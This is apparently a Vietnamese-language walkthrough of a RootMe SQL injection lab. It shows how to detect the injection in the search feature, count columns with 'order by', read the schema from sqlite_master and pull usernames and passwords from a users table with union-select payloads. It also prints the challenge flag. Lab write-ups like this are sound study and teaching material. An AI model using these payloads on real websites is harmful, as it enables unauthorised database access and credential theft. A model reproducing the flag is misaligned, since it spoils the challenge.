![image](https://github.com/nguyenngocdung18/RootMe/assets/134156226/c9db1a72-e4b6-4a6b-87a5-a947b5d41ecf)

trong lab này có 3 action là news, recherche, login thì có tính năng tìm kiếm (Cherche) là detect sqli

![image](https://github.com/nguyenngocdung18/RootMe/assets/134156226/2a7c6b23-cdad-4ce9-b3e0-6e1579c2c8b1)

=> nó sử dụng SQLite3
Hoặc không thì có thể thấy khi sử dụng ```' or 1=1--```

![image](https://github.com/nguyenngocdung18/RootMe/assets/134156226/c97e27fb-e3ef-4405-a348-0435779e4d1c)

Khi tôi thử đến ```' order by 3--``` thì báo lỗi => có 2 cột

![image](https://github.com/nguyenngocdung18/RootMe/assets/134156226/954025ba-a48a-4101-8716-187b7b696a10)

![image](https://github.com/nguyenngocdung18/RootMe/assets/134156226/65b06731-5751-4299-9e4a-d83947cbde99)

Sử dụng ```a’union select 1,sql FROM sqlite_master;``` => thấy tên bảng, tên cột

Sau đó chỉ cần ```a’ union select username,password FROM users--``` => flag là ```c4K04dtIaJsuWdi```

:V đến đây rồi thì dễ thôi nhưng có vẻ như lab quá lâu rồi và có vấn đề nào đó khi truy vấn tới database nên nó sẽ báo lỗi connect thì phải =))) tôi đoán vậy

